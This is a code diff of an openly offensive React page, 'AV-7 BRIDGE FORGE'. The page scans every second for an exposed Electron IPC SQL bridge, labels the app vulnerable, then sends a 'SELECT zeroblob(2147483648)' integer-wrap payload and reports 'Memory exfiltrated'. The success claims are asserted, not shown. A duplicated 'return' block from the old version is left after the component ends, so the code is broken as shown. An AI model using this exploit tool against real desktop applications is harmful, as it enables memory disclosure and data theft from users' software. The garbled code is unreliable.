@@ -19,33 +19,54 @@
 
     <script type="text/babel">
         function App() {
-            const [logs, setLogs] = React.useState([]);
-            const [dump, setDump] = React.useState("");
-
-            // Detect bridge
+        const [logs, setLogs] = React.useState([]);
+        const [dump, setDump] = React.useState("");
+        const [isVulnerable, setIsVulnerable] = React.useState(false);
+    
+        // This "Scanner" runs every 1 second to look for the bridge
+        React.useEffect(() => {
+            const scanner = setInterval(() => {
+                const bridge = window.api?.executeSql || window.electron?.dbQuery;
+                if (bridge && !isVulnerable) {
+                    setIsVulnerable(true);
+                    addLog("DETECTED: IPC Bridge discovered in global namespace!");
+                }
+            }, 1000);
+            return () => clearInterval(scanner);
+        }, [isVulnerable]);
+    
+        const addLog = (m) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${m}`, ...prev]);
+    
+        const runForge = async () => {
             const bridge = window.api?.executeSql || window.electron?.dbQuery;
+            addLog("Initiating Forge...");
+            try {
+                const result = await bridge("SELECT zeroblob(2147483648)");
+                setDump(JSON.stringify(result, null, 2));
+                addLog("SUCCESS: Memory exfiltrated.");
+            } catch (e) {
+                addLog(`FAIL: ${e.message}`);
+            }
+        };
 
-            const addLog = (m) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${m}`, ...prev]);
+    return (
+        <div className="terminal">
+            <h1>AV-7 BRIDGE FORGE</h1>
+            <div style={{color: isVulnerable ? '#00ff41' : '#ff4141', marginBottom: '20px'}}>
+                STATUS: {isVulnerable ? '● VULNERABLE' : '○ DISCONNECTED'}
+            </div>
+            
+            <button onClick={runForge} disabled={!isVulnerable}>
+                { !isVulnerable ? "WAITING FOR TARGET..." : "EXECUTE FORGE" }
+            </button>
 
-            const runForge = async () => {
-                addLog("Scanning for IPC Bridge...");
-                
-                if (!bridge) {
-                    addLog("CRITICAL: No Bridge found.");
-                    return;
-                }
-
-                addLog("Bridge Active. Firing 32-bit Integer Wrap (2^31)...");
-
-                try {
-                    const result = await bridge("SELECT zeroblob(2147483648) AS leak");
-                    addLog("EXPLOIT SUCCESS: Memory exfiltrated.");
-                    setDump(JSON.stringify(result, null, 2));
-                } catch (e) {
-                    addLog(`FAIL: Bridge rejected payload. Reason: ${e.message}`);
-                }
-            };
-
+            <div style={{marginTop: '20px', fontSize: '12px'}}>
+                {logs.map((l, i) => <div key={i}>{l}</div>)}
+            </div>
+            {dump && <pre>{dump}</pre>}
+        </div>
+    );
+}
             return (
                 <div className="terminal">
                     <h1 style={{color: '#fff', textShadow: '0 0 10px #00ff41'}}>AV-7 BRIDGE FORGE</h1>
